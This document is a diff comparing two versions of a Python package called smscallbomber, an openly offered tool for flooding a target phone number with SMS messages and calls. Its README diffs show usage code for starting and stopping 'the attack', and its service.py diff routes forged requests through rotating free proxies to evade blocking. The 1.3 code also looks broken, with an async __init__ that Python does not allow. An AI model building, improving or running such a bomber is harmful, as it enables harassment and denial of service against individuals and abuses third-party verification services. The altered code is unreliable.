# Comparing `tmp/smscallbomber-1.2.tar.gz` & `tmp/smscallbomber-1.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "smscallbomber-1.2.tar", last modified: Tue May  7 16:01:19 2024, max compression
+gzip compressed data, was "smscallbomber-1.3.tar", last modified: Tue May 28 14:03:27 2024, max compression
```

## Comparing `smscallbomber-1.2.tar` & `smscallbomber-1.3.tar`

### file list

```diff
@@ -1,19 +1,19 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2024-05-07 16:01:18.992536 smscallbomber-1.2/
--rw-r--r--   0 root         (0) root         (0)     1055 2024-05-05 16:24:34.000000 smscallbomber-1.2/LICENSE
--rw-r--r--   0 root         (0) root         (0)     3217 2024-05-07 16:01:18.992536 smscallbomber-1.2/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)     2720 2024-05-07 15:55:12.000000 smscallbomber-1.2/README.md
--rw-r--r--   0 root         (0) root         (0)       38 2024-05-07 16:01:19.000537 smscallbomber-1.2/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      784 2024-05-07 15:18:20.000000 smscallbomber-1.2/setup.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2024-05-07 16:01:18.932536 smscallbomber-1.2/smscallbomber/
--rw-r--r--   0 root         (0) root         (0)     2576 2024-05-07 15:49:01.000000 smscallbomber-1.2/smscallbomber/SMSCallBomber.py
--rw-r--r--   0 root         (0) root         (0)   579626 2024-05-07 15:56:09.000000 smscallbomber-1.2/smscallbomber/Services.py
--rw-r--r--   0 root         (0) root         (0)  1335628 2024-05-03 17:22:00.000000 smscallbomber-1.2/smscallbomber/User_Agent.py
--rw-r--r--   0 root         (0) root         (0)       40 2024-05-06 17:45:26.000000 smscallbomber-1.2/smscallbomber/__init__.py
--rw-r--r--   0 root         (0) root         (0)      382 2024-05-06 17:33:22.000000 smscallbomber-1.2/smscallbomber/config.py
--rw-r--r--   0 root         (0) root         (0)     2144 2024-05-07 15:16:09.000000 smscallbomber-1.2/smscallbomber/service.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2024-05-07 16:01:18.992536 smscallbomber-1.2/smscallbomber.egg-info/
--rw-r--r--   0 root         (0) root         (0)     3217 2024-05-07 16:01:16.000000 smscallbomber-1.2/smscallbomber.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      380 2024-05-07 16:01:16.000000 smscallbomber-1.2/smscallbomber.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2024-05-07 16:01:16.000000 smscallbomber-1.2/smscallbomber.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       18 2024-05-07 16:01:16.000000 smscallbomber-1.2/smscallbomber.egg-info/requires.txt
--rw-r--r--   0 root         (0) root         (0)       14 2024-05-07 16:01:16.000000 smscallbomber-1.2/smscallbomber.egg-info/top_level.txt
+drwxr-xr-x   0 root         (0) root         (0)        0 2024-05-28 14:03:27.452425 smscallbomber-1.3/
+-rw-r--r--   0 root         (0) root         (0)     1055 2024-05-05 16:24:34.000000 smscallbomber-1.3/LICENSE
+-rw-r--r--   0 root         (0) root         (0)     4457 2024-05-28 14:03:27.452425 smscallbomber-1.3/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)     3994 2024-05-11 13:43:44.000000 smscallbomber-1.3/README.md
+-rw-r--r--   0 root         (0) root         (0)       38 2024-05-28 14:03:27.452425 smscallbomber-1.3/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      784 2024-05-28 14:02:27.000000 smscallbomber-1.3/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2024-05-28 14:03:27.448425 smscallbomber-1.3/smscallbomber/
+-rw-r--r--   0 root         (0) root         (0)     2282 2024-05-11 13:37:35.000000 smscallbomber-1.3/smscallbomber/SMSCallBomber.py
+-rw-r--r--   0 root         (0) root         (0)   579626 2024-05-07 15:56:09.000000 smscallbomber-1.3/smscallbomber/Services.py
+-rw-r--r--   0 root         (0) root         (0)  1335628 2024-05-03 17:22:00.000000 smscallbomber-1.3/smscallbomber/User_Agent.py
+-rw-r--r--   0 root         (0) root         (0)       40 2024-05-06 17:45:26.000000 smscallbomber-1.3/smscallbomber/__init__.py
+-rw-r--r--   0 root         (0) root         (0)      382 2024-05-06 17:33:22.000000 smscallbomber-1.3/smscallbomber/config.py
+-rw-r--r--   0 root         (0) root         (0)     2220 2024-05-28 09:51:47.000000 smscallbomber-1.3/smscallbomber/service.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2024-05-28 14:03:27.452425 smscallbomber-1.3/smscallbomber.egg-info/
+-rw-r--r--   0 root         (0) root         (0)     4457 2024-05-28 14:03:27.000000 smscallbomber-1.3/smscallbomber.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      380 2024-05-28 14:03:27.000000 smscallbomber-1.3/smscallbomber.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2024-05-28 14:03:27.000000 smscallbomber-1.3/smscallbomber.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       18 2024-05-28 14:03:27.000000 smscallbomber-1.3/smscallbomber.egg-info/requires.txt
+-rw-r--r--   0 root         (0) root         (0)       14 2024-05-28 14:03:27.000000 smscallbomber-1.3/smscallbomber.egg-info/top_level.txt
```

### Comparing `smscallbomber-1.2/LICENSE` & `smscallbomber-1.3/LICENSE`

 * *Files identical despite different names*

### Comparing `smscallbomber-1.2/PKG-INFO` & `smscallbomber-1.3/PKG-INFO`

 * *Files 23% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: smscallbomber
-Version: 1.2
+Version: 1.3
 Summary: A library for SMS and call bomber / Библиотека для SMS бомбера со звонками
 Home-page: https://github.com/BabayVadimovich/SMSCallBomber
 Author: BabayVadimovich
 Author-email: hmatvej49@gmail.com
 Keywords: bomber,sms,call,smsbomber
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
@@ -18,14 +18,22 @@
 
 ## English
 
 ### Description
 
 This library provides functionality for SMS and call bombing.
 
+### Installation
+
+You can install the SMSCallBomber library via pip:
+
+```bash
+pip install SMSCallBomber
+```
+
 ### Usage
 
 ```python
 from smscallbomber import SMSCallBomber
 import time
 from argparse import Namespace
 
@@ -35,16 +43,25 @@
 t = SMSCallBomber(args)
 
 # Starting the attack
 t.start()
 
 # Stopping the attack
 t.stop()
-
-# The function will return the result of the attack after it is executed or stopped
+time.sleep(10) # Increase the time if the results contain zeros
+successful, failed = t.send_report()
+print(f"Successfully sent (Not everyone can get there!): {successful}")
+print(f"Failed to send: {failed}")
+
+# Returns the result of the attack after it ends
+time.sleep(args.time)
+time.sleep(10) # Increase the time if the results contain zeros
+successful, failed = t.send_report()
+print(f"Successfully sent (Not everyone can get there!): {successful}")
+print(f"Failed to send: {failed}")
 ```
 
 ### Donation
 
 If you find this project helpful and would like to support its development, you can make a donation to the author.
 
 - SBP, Sberbank, Tinkoff: +79024314981
@@ -60,14 +77,22 @@
 
 ## Русский
 
 ### Описание
 
 Эта библиотека предоставляет функционал для SMS бомбера со звонками.
 
+### Установка
+
+Вы можете установить библиотеку SMSCallBomber с помощью pip:
+
+```bash
+pip install SMSCallBomber
+```
+
 ### Использование
 
 ```python
 from smscallbomber import SMSCallBomber
 import time
 from argparse import Namespace
 
@@ -77,16 +102,25 @@
 t = SMSCallBomber(args)
 
 # Запуск атаки
 t.start()
 
 # Остановка атаки
 t.stop()
-
-# Функция вернёт результат атаки после её выполнения или остановки
+time.sleep(10) # Увеличьте время если в результатах по нулям
+successful, failed = t.send_report()
+print(f"Успешно отправлено(Дойти могут не все!): {successful}")
+print(f"Не удалось отправить: {failed}")
+
+# Возвращает результат атаки после её окончания
+time.sleep(args.time)
+time.sleep(10) # Увеличьте время если в результатах по нулям
+successful, failed = t.send_report()
+print(f"Успешно отправлено(Дойти могут не все!): {successful}")
+print(f"Не удалось отправить: {failed}")
 ```
 
 ### Пожертвование
 
 Если вы нашли этот проект полезным и хотели бы поддержать его развитие, вы можете сделать пожертвование автору.
 
 - СБП, Сбербанк, Тинькофф: +79024314981
```

### Comparing `smscallbomber-1.2/setup.py` & `smscallbomber-1.3/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 from setuptools import setup, find_packages
 
 setup(
     name='smscallbomber',
     packages=find_packages(),
-    version='1.2',
+    version='1.3',
     author='BabayVadimovich',
     author_email='hmatvej49@gmail.com',
     description='A library for SMS and call bomber / Библиотека для SMS бомбера со звонками',
     long_description=open('README.md').read(),
     long_description_content_type='text/markdown',
     url='https://github.com/BabayVadimovich/SMSCallBomber',
     install_requires=[
```

### Comparing `smscallbomber-1.2/smscallbomber/Services.py` & `smscallbomber-1.3/smscallbomber/Services.py`

 * *Files identical despite different names*

### Comparing `smscallbomber-1.2/smscallbomber/User_Agent.py` & `smscallbomber-1.3/smscallbomber/User_Agent.py`

 * *Files identical despite different names*

### Comparing `smscallbomber-1.2/smscallbomber/service.py` & `smscallbomber-1.3/smscallbomber/service.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,11 +1,12 @@
 import random
 import string
-import requests
-import smscallbomber.config as cfg
+import asynchronous_requests as requests
+import config as cfg
+import asyncio
 
 def username():
     names = cfg.names
     return random.choice(names)
 
 def email():
     emails = cfg.emails
@@ -20,18 +21,18 @@
 
 def randomToken():
     letters = string.ascii_letters + string.digits
     return "".join(random.choice(letters) for i in range(30))
 
 
 class Service:
-    def __init__(self, service_info, phone, timeout):
+    async def __init__(self, service_info, phone, timeout):
         self.service_info = service_info
         self.timeout = timeout
-        self.proxy = self.generate_proxy()
+        self.proxy = await self.generate_proxy()
         self.phone = phone
 
     def __parse_data(self):
         self.method = self.service_info['method']
         self.url = self.service_info['url']
         self.headers = self.service_info.get('headers', {})
         self.cookies = self.service_info.get('cookies', {})
@@ -48,19 +49,19 @@
             "%token%": randomToken()
         }.items():
             if old in str(self.data):
                 self.data = str(self.data).replace(old, new)
             if old in str(self.json):
                 self.json = str(self.json).replace(old, new)
 
-    def generate_proxy(self):
-        proxy = requests.get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true")
+    async def generate_proxy(self):
+        proxy = await requests.get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true&maxCheckPeriod=3600")
         return {"http": proxy.text, "https": proxy.text}
 
-    def send_request(self):
+    async def send_request(self):
         self.__parse_data()
         self.__replace_data()
 
         session = requests.Session()
         request = requests.Request(self.method.upper(), self.url, headers=self.headers, cookies=self.cookies, data=self.data, json=self.json)
         request = request.prepare()
         session.proxies = self.proxy
```

### Comparing `smscallbomber-1.2/smscallbomber.egg-info/PKG-INFO` & `smscallbomber-1.3/smscallbomber.egg-info/PKG-INFO`

 * *Files 23% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: smscallbomber
-Version: 1.2
+Version: 1.3
 Summary: A library for SMS and call bomber / Библиотека для SMS бомбера со звонками
 Home-page: https://github.com/BabayVadimovich/SMSCallBomber
 Author: BabayVadimovich
 Author-email: hmatvej49@gmail.com
 Keywords: bomber,sms,call,smsbomber
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
@@ -18,14 +18,22 @@
 
 ## English
 
 ### Description
 
 This library provides functionality for SMS and call bombing.
 
+### Installation
+
+You can install the SMSCallBomber library via pip:
+
+```bash
+pip install SMSCallBomber
+```
+
 ### Usage
 
 ```python
 from smscallbomber import SMSCallBomber
 import time
 from argparse import Namespace
 
@@ -35,16 +43,25 @@
 t = SMSCallBomber(args)
 
 # Starting the attack
 t.start()
 
 # Stopping the attack
 t.stop()
-
-# The function will return the result of the attack after it is executed or stopped
+time.sleep(10) # Increase the time if the results contain zeros
+successful, failed = t.send_report()
+print(f"Successfully sent (Not everyone can get there!): {successful}")
+print(f"Failed to send: {failed}")
+
+# Returns the result of the attack after it ends
+time.sleep(args.time)
+time.sleep(10) # Increase the time if the results contain zeros
+successful, failed = t.send_report()
+print(f"Successfully sent (Not everyone can get there!): {successful}")
+print(f"Failed to send: {failed}")
 ```
 
 ### Donation
 
 If you find this project helpful and would like to support its development, you can make a donation to the author.
 
 - SBP, Sberbank, Tinkoff: +79024314981
@@ -60,14 +77,22 @@
 
 ## Русский
 
 ### Описание
 
 Эта библиотека предоставляет функционал для SMS бомбера со звонками.
 
+### Установка
+
+Вы можете установить библиотеку SMSCallBomber с помощью pip:
+
+```bash
+pip install SMSCallBomber
+```
+
 ### Использование
 
 ```python
 from smscallbomber import SMSCallBomber
 import time
 from argparse import Namespace
 
@@ -77,16 +102,25 @@
 t = SMSCallBomber(args)
 
 # Запуск атаки
 t.start()
 
 # Остановка атаки
 t.stop()
-
-# Функция вернёт результат атаки после её выполнения или остановки
+time.sleep(10) # Увеличьте время если в результатах по нулям
+successful, failed = t.send_report()
+print(f"Успешно отправлено(Дойти могут не все!): {successful}")
+print(f"Не удалось отправить: {failed}")
+
+# Возвращает результат атаки после её окончания
+time.sleep(args.time)
+time.sleep(10) # Увеличьте время если в результатах по нулям
+successful, failed = t.send_report()
+print(f"Успешно отправлено(Дойти могут не все!): {successful}")
+print(f"Не удалось отправить: {failed}")
 ```
 
 ### Пожертвование
 
 Если вы нашли этот проект полезным и хотели бы поддержать его развитие, вы можете сделать пожертвование автору.
 
 - СБП, Сбербанк, Тинькофф: +79024314981
```

